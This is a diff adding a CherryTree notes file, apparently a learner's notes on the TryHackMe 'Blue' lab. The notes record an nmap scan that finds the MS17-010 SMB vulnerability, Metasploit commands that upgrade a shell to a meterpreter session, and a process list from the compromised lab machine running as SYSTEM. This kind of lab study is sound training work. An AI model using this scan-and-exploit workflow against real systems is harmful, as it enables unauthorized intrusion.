@@ -1,0 +1,104 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="TryHackMe" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655729934.5" ts_lastsave="1655729937.54" unique_id="1">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Blue" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655729940.8" ts_lastsave="1655733543.72" unique_id="2">
+			<rich_text link="webs https://tryhackme.com/room/blue">https://tryhackme.com/room/blue</rich_text>
+			<rich_text>
+
+Nmap Scanning:
+
+sudo nmap --script vuln 10.10.195.153 
+
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49158/tcp open  unknown
+49160/tcp open  unknown
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       </rich_text>
+			<rich_text link="webs https://technet.microsoft.com/en-us/library/security/ms17-010.aspx">https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</rich_text>
+			<rich_text>
+|       </rich_text>
+			<rich_text link="webs https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/">https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</rich_text>
+			<rich_text>
+|_      </rich_text>
+			<rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</rich_text>
+			<rich_text>
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+
+start metasploit
+sudo msfconsole init -q
+
+set meterpreter to shell
+use post/multi/manage/shell_to_meterpreter
+set session &lt;meterpreter_session&gt;
+sessions -i &lt;new_session&gt;
+
+meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 608   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 724   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 764   692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 1064  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1156  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1300  608   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe
+ 1324  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1388  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1460  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1600  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1660  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+ 1748  2932  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 1924  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2088  816   WmiPrvSE.exe
+ 2184  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 2324  2376  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 2340  692   taskhost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\taskhost.exe
+ 2608  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM
+ 2932  692   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 2944  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 2968  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+ 3016  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+</rich_text>
+		</node>
+	</node>
+</cherrytree>
